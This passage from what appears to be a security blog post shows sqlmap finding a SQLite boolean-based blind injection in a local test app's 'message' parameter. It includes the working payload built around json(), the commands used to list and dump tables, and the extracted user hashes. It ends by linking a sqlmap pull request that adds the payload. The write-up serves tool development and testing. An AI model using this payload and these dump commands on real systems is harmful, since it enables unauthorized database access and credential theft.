<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on POST parameter <span class="s1">'message'</span>
<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'AND boolean-based blind - WHERE or HAVING clause'</span>
<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'Boolean-based blind - Parameter replace (original value)'</span>
<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'Generic inline queries'</span>
<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'SQLite boolean-based blind'</span>
<span class="o">[</span>13:18:57] <span class="o">[</span>INFO] POST parameter <span class="s1">'message'</span> appears to be <span class="s1">'SQLite boolean-based blind'</span> injectable 
<span class="k">for </span>the remaining tests, <span class="k">do </span>you want to include all tests <span class="k">for</span> <span class="s1">'SQLite'</span> extending provided level <span class="o">(</span>1<span class="o">)</span> and risk <span class="o">(</span>1<span class="o">)</span> values? <span class="o">[</span>Y/n] n
<span class="o">[</span>13:19:02] <span class="o">[</span>INFO] testing <span class="s1">'Generic UNION query (NULL) - 1 to 20 columns'</span>
<span class="o">[</span>13:19:02] <span class="o">[</span>INFO] automatically extending ranges <span class="k">for </span>UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
<span class="o">[</span>13:19:02] <span class="o">[</span>INFO] checking <span class="k">if </span>the injection point on POST parameter <span class="s1">'message'</span> is a <span class="nb">false </span>positive
POST parameter <span class="s1">'message'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 46 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: message <span class="o">(</span>POST<span class="o">)</span>
    Type: boolean-based blind
    Title: SQLite boolean-based blind
    Payload: <span class="nv">message</span><span class="o">=</span>a<span class="s1">' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND '</span>EDIB<span class="s1">'='</span>EDIB

</code></pre></div></div>

<p><br /></p>

<p>As the new payload with the function <code class="language-plaintext highlighter-rouge">json</code> is shorter than my initial <code class="language-plaintext highlighter-rouge">load_extension</code> method, the length check in <code class="language-plaintext highlighter-rouge">app.py</code> can be put back and it still works.</p>

<p><br /></p>

<p>Dump the tables:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">--tables</span>

<span class="o">[</span>...]

sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>                                                   
Parameter: message <span class="o">(</span>POST<span class="o">)</span>                                                                                              
    Type: boolean-based blind
    Title: SQLite boolean-based blind
    Payload: <span class="nv">message</span><span class="o">=</span>a<span class="s1">' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND '</span>EDIB<span class="s1">'='</span>EDIB
<span class="nt">---</span>                                  
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] testing SQLite                                                                                       
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] confirming SQLite
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] actively fingerprinting SQLite
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite                           
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] fetching tables <span class="k">for </span>database: <span class="s1">'SQLite_masterdb'</span>
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] fetching number of tables <span class="k">for </span>database <span class="s1">'SQLite_masterdb'</span>
<span class="o">[</span>13:20:44] <span class="o">[</span>WARNING] running <span class="k">in </span>a single-thread mode. Please consider usage of option <span class="s1">'--threads'</span> <span class="k">for </span>faster data retrieval
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] retrieved: 2                                                                                         
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] retrieved: <span class="nb">users</span>                  
<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] retrieved: messages                                                                                  
&lt;current&gt;                     
<span class="o">[</span>2 tables]                    
+----------+                                                                                                           
| messages |                      
| <span class="nb">users</span>    |                  
+----------+
</code></pre></div></div>

<p><br /></p>

<p>Dump data from the <code class="language-plaintext highlighter-rouge">users</code> table:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>

<span class="o">[</span>...]

sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: message <span class="o">(</span>POST<span class="o">)</span>
    Type: boolean-based blind
    Title: SQLite boolean-based blind
    Payload: <span class="nv">message</span><span class="o">=</span>a<span class="s1">' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND '</span>EDIB<span class="s1">'='</span>EDIB
<span class="nt">---</span>

<span class="o">[</span>...]

<span class="o">[</span>13:21:04] <span class="o">[</span>INFO] retrieved: CREATE TABLE <span class="nb">users</span><span class="o">(</span>username varchar<span class="o">(</span>20<span class="o">)</span>, secret varchar<span class="o">(</span>200<span class="o">)</span>, role INT<span class="o">)</span>
<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'users'</span>
<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] fetching number of entries <span class="k">for </span>table <span class="s1">'users'</span> <span class="k">in </span>database <span class="s1">'SQLite_masterdb'</span>
<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] retrieved: 2
<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] retrieved: 1
<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] retrieved: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
<span class="o">[</span>13:21:07] <span class="o">[</span>INFO] retrieved: admin
<span class="o">[</span>13:21:07] <span class="o">[</span>INFO] retrieved: 0
<span class="o">[</span>13:21:07] <span class="o">[</span>INFO] retrieved: 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec
<span class="o">[</span>13:21:08] <span class="o">[</span>INFO] retrieved: guest
<span class="o">[</span>13:21:08] <span class="o">[</span>INFO] recognized possible password hashes <span class="k">in </span>column <span class="s1">'secret'</span>
<span class="k">do </span>you want to store hashes to a temporary file <span class="k">for </span>eventual further processing with other tools <span class="o">[</span>y/N] N
<span class="k">do </span>you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q] n
Database: &lt;current&gt;
Table: <span class="nb">users</span>
<span class="o">[</span>2 entries]
+------+------------------------------------------------------------------+----------+
| role | secret                                                           | username |
+------+------------------------------------------------------------------+----------+
| 1    | f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105 | admin    |
| 0    | 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec | guest    |
+------+------------------------------------------------------------------+----------+

</code></pre></div></div>

<p>The Pull Request can be found here: <a href="https://github.com/sqlmapproject/sqlmap/pull/5501">Add SQLite AND boolean-based blind payload</a>.</p>]]></content><author><name>soka</name></author><category term="web" /><summary type="html"><![CDATA[Context]]></summary></entry></feed>